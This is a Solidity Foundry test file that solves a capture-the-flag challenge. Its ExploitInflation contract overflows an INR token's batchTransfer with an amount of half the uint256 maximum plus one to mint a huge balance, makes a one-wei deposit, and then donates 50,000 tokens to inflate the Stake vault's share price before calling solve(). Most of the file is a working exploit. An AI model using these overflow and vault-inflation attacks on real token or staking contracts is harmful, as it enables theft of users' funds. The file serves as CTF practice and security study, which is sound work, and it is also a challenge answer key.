// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test,console} from "forge-std/Test.sol";
import {Setup,Stake,INR} from "src/Setup.sol";

contract testChall is Test{
    Stake stake;
    INR inr;
    Setup setup;
    address player=makeAddr("PLAYER");
    function setUp()public{
        setup=new Setup();
        inr=setup.inr();
        stake=setup.stake();
    }

    function test_Exploit()public{
        startHoax(player);
        ExploitInflation _exploit=new ExploitInflation(setup);
        _exploit.Exploit();
    }

    function test_unintended()public{
        startHoax(player);
        vm.expectRevert(abi.encodeWithSelector(Setup.Setup__Not__Yet__Staked.selector));
        setup.solve();
    }
}

contract ExploitInflation{
    Stake stake;
    INR inr;
    Setup setup;

    constructor(Setup _setup){
        setup=_setup;
        inr=setup.inr();
        stake=setup.stake();
    }

    function Exploit()public{
        setup.claim();
        uint256 stakeAmount=1;
        uint256 inflationAmount=50_000 ether;
        address[] memory Receivers=new address[](2);
        Receivers[0]=address(this);
        Receivers[1]=address(0);
        uint256 amount=((type(uint256).max)/2)+1;
        inr.batchTransfer(Receivers, amount);
        inr.approve(address(stake), stakeAmount);
        stake.deposit(stakeAmount, address(this));
        inr.transfer(address(stake), inflationAmount);
        setup.stakeINR();
        setup.solve();
    }
}